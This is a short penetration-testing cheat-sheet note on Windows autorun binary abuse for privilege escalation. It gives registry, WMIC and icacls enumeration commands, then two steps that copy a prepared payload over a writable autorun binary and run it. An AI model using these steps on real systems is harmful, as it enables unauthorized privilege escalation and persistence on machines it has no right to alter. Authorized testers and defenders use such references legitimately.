---
technique: Autorun Binary Abuse
category: privilege-escalation
targets: Windows Autoruns
protocols: Local
remote_capable: false
tags: windows privilege-escalation autoruns startup writable
---

# Autorun Binary Abuse

Autorun binary abuse targets startup entries that point to writable files or directories and execute in a more privileged user context.

## Prerequisites

| Requirement | Detail |
|-------------|--------|
| Writable autorun target | Operator must modify the executable or its parent path |
| Privileged trigger | A privileged user or service must trigger the autorun |
| Prepared payload | Payload construction belongs in a tool or payload note |

## Windows

### Machine run keys

#cmd #registry #autorun

List machine-wide run key entries.

```cmd title:"List HKLM Run key entries"
reg query HKLM\Software\Microsoft\Windows\CurrentVersion\Run
```
<!-- cheat -->

### User run keys

#cmd #registry #autorun

List current user run key entries.

```cmd title:"List HKCU Run key entries"
reg query HKCU\Software\Microsoft\Windows\CurrentVersion\Run
```
<!-- cheat -->

### Startup commands

#cmd #wmic #autorun

List startup commands through WMIC.

```cmd title:"List startup commands"
wmic startup get caption,command,user
```
<!-- cheat -->

### Check autorun target permissions

#cmd #filesystem #autorun

Check permissions on an autorun executable path.

```cmd title:"Check autorun target permissions"
icacls "$target_path"
```
<!-- cheat
var target_path
-->

### Step 1: Replace autorun binary

#cmd #autorun

Copy a prepared payload over a writable autorun binary.

```cmd title:"Replace autorun binary"
copy "$payload_file" "$target_path"
```
<!-- cheat
var payload_file
var target_path
-->

### Step 2: Trigger autorun path

#cmd #autorun

Run the autorun binary manually when the trigger can be invoked.

```cmd title:"Run autorun binary"
"$target_path"
```
<!-- cheat
var target_path
-->

## Linux

No Linux operator command is included here. This note covers Windows autorun binary abuse.
